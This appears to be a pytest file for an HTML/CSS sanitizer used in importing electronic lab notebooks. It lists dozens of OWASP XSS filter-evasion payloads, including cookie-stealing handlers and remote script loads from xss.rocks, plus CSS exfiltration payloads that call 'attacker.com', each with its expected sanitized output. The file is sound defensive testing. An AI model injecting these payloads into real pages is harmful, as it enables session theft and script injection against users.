from sampledb.logic import eln_sanitizer

ROOT_PATH = '/'
ELN_IMPORT_ID = 1

# Test cases from: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
OWASP_XSS_TEST_CASES = [
    {
        "payload": "<script>alert('xss')</script>",
        "expected_result": "",
    },
    {
        "payload": "<script><script>alert('xss')</script></script>",
        "expected_result": "",
    },
    {
        "payload": r'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//\'>',
        "expected_result": "javascript:/*--&gt;"
    },
    {
        "payload": r'\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>',
        "expected_result": r"\<a>xxs link\</a>"
    },
    {
        "payload": r'\<a onmouseover=alert(document.cookie)\>xxs link\</a\>',
        "expected_result": r"\<a>xxs link\</a>"
    },
    {
        "payload": r'<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>',
        "expected_result": '<img/>"\\&gt;'
    },
    {
        "payload": r'<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>',
        "expected_result": '<a>Click Me!</a>',
    },
    {
        "payload": r'<IMG SRC=# onmouseover="alert(\'xxs\')">',
        "expected_result": '<img src="#"/>'
    },
    {
        "payload": r'<IMG SRC= onmouseover="alert(\'xxs\')">',
        "expected_result": '<img/>'
    },
    {
        "payload": r'<IMG onmouseover="alert(\'xxs\')">',
        "expected_result": '<img/>'
    },
    {
        "payload": r'<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
        "expected_result": "<img/>"
    },
    {
        "payload": r'<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
        "expected_result": "<img/>"
    },
    {
        "payload": r'<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>',
        "expected_result": "<a>Click Me!</a>"
    },
    {
        "payload": r'<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>',
        "expected_result": "<a>Click Me</a>"
    },
    {
        "payload": r'<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>',
        "expected_result": "<a>Click Me</a>"
    },
    {
        "payload": r'<a href="jav   ascript:alert(\'XSS\');">Click Me</a>',
        "expected_result": "<a>Click Me</a>"
    },
    {
        "payload": r'<a href="jav&#x09;ascript:alert(\'XSS\');">Click Me</a>',
        "expected_result": '<a>Click Me</a>',
    },
    {
        "payload": r'<a href="jav&#x0A;ascript:alert(\'XSS\');">Click Me</a>',
        "expected_result": '<a>Click Me</a>',
    },
    {
        "payload": r'<a href="jav&#x0D;ascript:alert(\'XSS\');">Click Me</a>',
        "expected_result": '<a>Click Me</a>',
    },
    {
        "payload": r'<a href=" &#14;  javascript:alert(\'XSS\');">Click Me</a>',
        "expected_result": '<a>Click Me</a>',
    },
    {
        "payload": r'<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": '',
    },
    {
        "payload": r'<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
        "expected_result": '<body></body>',
    },
    {
        "payload": r'<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": ''
    },
    {
        "payload": r'<<SCRIPT>alert("XSS");//\<</SCRIPT>',
        "expected_result": '&lt;'
    },
    {
        "payload": r'<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
        "expected_result": ''
    },
    {
        "payload": r'<SCRIPT SRC=//xss.rocks/.j>',
        "expected_result": ''
    },
    {
        "payload": r'<IMG SRC="`<javascript:alert>`(\'XSS\')"',
        "expected_result": ''
    },
    {
        "payload": r'<TITLE></TITLE><SCRIPT>alert("XSS");</SCRIPT></TITLE>',
        "expected_result": '<title></title>'
    },
    {
        "payload": r'<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
        "expected_result": '<input type="IMAGE"/>'
    },
    {
        "payload": r'<BODY BACKGROUND="javascript:alert(\'XSS\')">',
        "expected_result": "<body></body>"
    },
    {
        "payload": r'<IMG DYNSRC="javascript:alert(\'XSS\')">',
        "expected_result": "<img/>"
    },
    {
        "payload": r'<IMG LOWSRC="javascript:alert(\'XSS\')">',
        "expected_result": "<img/>"
    },
    {
        "payload": r'<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
        "expected_result": "<style>li {}</style><ul><li>XSS</li></ul>"
    },
    {
        "payload": r'<IMG SRC=\'vbscript:msgbox("XSS")\'>',
        "expected_result": "<img/>"
    },
    {
        "payload": r'<svg/onload=alert(\'XSS\')>',
        "expected_result": ""
    },
    {
        "payload": r'<BODY ONLOAD=alert(\'XSS\')>',
        "expected_result": "<body></body>"
    },
    {
        "payload": r'<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
        "expected_result": '',
    },
    {
        "payload": r'<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">',
        "expected_result": ""
    },
    {
        "payload": '<STYLE>@import"http://xss.rocks/xss.css";</STYLE>',
        "expected_result": "<style></style>"
    },
    {
        "payload": r'<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>',
        "expected_result": "<style>BODY{}</style>"
    },
    {
        "payload": "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
        "expected_result": "<style></style>"
    },
    {
        "payload": r'<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
        "expected_result": "<meta/>"
    },
    {
        "payload": '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
        "expected_result": "<meta content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"/>",
    },
    {
        "payload": '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
        "expected_result": "<meta/>"
    },
    {
        "payload": '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
        "expected_result": "",
    },
    {
        "payload": '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
        "expected_result": "",
    },
    {
        "payload": '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
        "expected_result": ""
    },
    {
        "payload": '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
        "expected_result": "<table></table>"
    },
    {
        "payload": '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        "expected_result": "<table><td></td></table>"
    },
    {
        "payload": '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
        "expected_result": '<div style=""></div>'
    },
    {
        "payload": '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        "expected_result": '<div style=""></div>'
    },
    {
        "payload": '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
        "expected_result": ''
    },
    {
        "payload": '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
        "expected_result": ''
    },
    {
        "payload": '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": ''
    },
    {
        "payload": '<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": ''
    },
    {
        "payload": '<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": ''
    },
    {
        "payload": '<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": ''
    },
    {
        "payload": '<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": ''
    },
    {
        "payload": '<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": ''
    },
    {
        "payload": '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        "expected_result": 'PT SRC="httx://xss.rocks/xss.js"&gt;'
    },
    {
        "payload": '<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>',
        "expected_result": '<a>Share</a>'
    },
]

CSS_EXFILTRATION_TEST_DATA = [
    {
        "payload": """
@import url("attacker.com");
@import url(attacker.com);
@import "attacker.com";
@import attacker.com;

@import "./ro-crate-preview_files/styles.css";
""",
        "expected_result": "@import /eln_imports/1/preview?subpath=styles.css;"
    },
    {
        "payload": """
html {
    background-image: url(attacker.com);
    background-image: url("attacker.com");
    background-image: image-set(attacker.com);
}
        """,
        "expected_result": "html {\n}"
    },
    {
        "payload": """
html {
    background-image: url(./ro-crate-preview_files/image1.png);
    background-image: image-set("./ro-crate-preview_files/image2.png" 1x);
}
        """,
        "expected_result": """
html {
    background-image: url(/eln_imports/1/preview?subpath=image1.png);
}
"""
    },
    {
        "payload": """
@media (max-width: 768px) {
    html {
        background-image: url(./ro-crate-preview_files/image1.png);
        background-image: image-set("./ro-crate-preview_files/image2.png" 1x);
        height: 100px;
    }
}
        """,
        "expected_result": """
@media (max-width: 768px) {
    html {
        background-image: url(/eln_imports/1/preview?subpath=image1.png);
        height: 100px;
    }
}
"""
    },
]


def test_eln_sanitizer_html_replace_supplied_file_url(app):
    referenced_files_root = []
    referenced_files_style = []
    referenced_files_subdir = []
    referenced_files_different_root_path = []
    valid_preview_files = [
        'ro-crate-preview.html',
        'ro-crate-preview_files/styles.css',
        'ro-crate-preview_files/subdir/test.html',
        'ro-crate-preview_files/abc/test.html',
    ]

    with app.test_request_context('/'):
        sanitizer = eln_sanitizer.ELNSanitizer(eln_import_id=ELN_IMPORT_ID, root_path=ROOT_PATH, referenced_files=referenced_files_root, valid_preview_files=valid_preview_files)
        sanitized_content_root = sanitizer.sanitize("<a href='ro-crate-preview.html'>Preview</a>", mime_type="text/html")
        sanitizer = eln_sanitizer.ELNSanitizer(eln_import_id=ELN_IMPORT_ID, root_path=ROOT_PATH, referenced_files=referenced_files_style, valid_preview_files=valid_preview_files)
        sanitized_content_style = sanitizer.sanitize("<a href='./ro-crate-preview_files/styles.css'>Preview</a>", mime_type="text/html")
        sanitizer = eln_sanitizer.ELNSanitizer(eln_import_id=ELN_IMPORT_ID, root_path=ROOT_PATH, referenced_files=referenced_files_subdir, valid_preview_files=valid_preview_files)
        sanitized_content_subdir = sanitizer.sanitize("<a href='./ro-crate-preview_files/subdir/test.html'>Preview</a>", mime_type="text/html")
        sanitizer = eln_sanitizer.ELNSanitizer(eln_import_id=ELN_IMPORT_ID, root_path="/ro-crate-preview_files/abc/", referenced_files=referenced_files_different_root_path, valid_preview_files=valid_preview_files)
        sanitized_content_different_root_path = sanitizer.sanitize("<a href='test.html'>Preview</a>", mime_type="text/html")
        sanitizer = eln_sanitizer.ELNSanitizer(eln_import_id=ELN_IMPORT_ID, root_path="/ro-crate-preview_files/abc/", referenced_files=[], valid_preview_files=valid_preview_files)
        sanitized_content_different_root_path_not_available = sanitizer.sanitize("<a href='not_available.html'>Preview</a>", mime_type="text/html")

    assert ['/ro-crate-preview.html'] == referenced_files_root
    assert f'<a href="/eln_imports/{ELN_IMPORT_ID}/preview">Preview</a>' == sanitized_content_root
    assert ['/ro-crate-preview_files/styles.css'] == referenced_files_style
    assert f'<a href="/eln_imports/{ELN_IMPORT_ID}/preview?subpath=styles.css">Preview</a>' == sanitized_content_style
    assert ['/ro-crate-preview_files/subdir/test.html'] == referenced_files_subdir
    assert f'<a href="/eln_imports/{ELN_IMPORT_ID}/preview?subpath=subdir/test.html">Preview</a>' == sanitized_content_subdir
    assert ['/ro-crate-preview_files/abc/test.html'] == referenced_files_different_root_path
    assert f'<a href="/eln_imports/{ELN_IMPORT_ID}/preview?subpath=abc/test.html">Preview</a>' == sanitized_content_different_root_path
    assert '<a>Preview</a>' == sanitized_content_different_root_path_not_available


def test_eln_sanitizer_html_owasp_snippets(app):
    with app.test_request_context('/'):
        sanitizer = eln_sanitizer.ELNSanitizer(
            eln_import_id=ELN_IMPORT_ID,
            root_path=ROOT_PATH,
            referenced_files=[],
            valid_preview_files=[]
        )
        for test_case in OWASP_XSS_TEST_CASES:
            sanitized_content = sanitizer.sanitize(
                content=test_case['payload'],
                mime_type="text/html",
            )
            assert sanitized_content == test_case['expected_result']


def test_eln_sanitizer_css_exfiltration(app):
    valid_preview_files = [
        'ro-crate-preview_files/styles.css',
        'ro-crate-preview_files/image1.png'
    ]
    with app.test_request_context('/'):
        sanitizer = eln_sanitizer.ELNSanitizer(
            eln_import_id=ELN_IMPORT_ID,
            root_path=ROOT_PATH,
            referenced_files=[],
            valid_preview_files=valid_preview_files,
        )
        for test_data in CSS_EXFILTRATION_TEST_DATA:
            sanitized_content = sanitizer.sanitize(
                content=test_data['payload'].strip(),
                mime_type="text/css",
            )
            assert test_data['expected_result'].strip() == sanitized_content.strip()
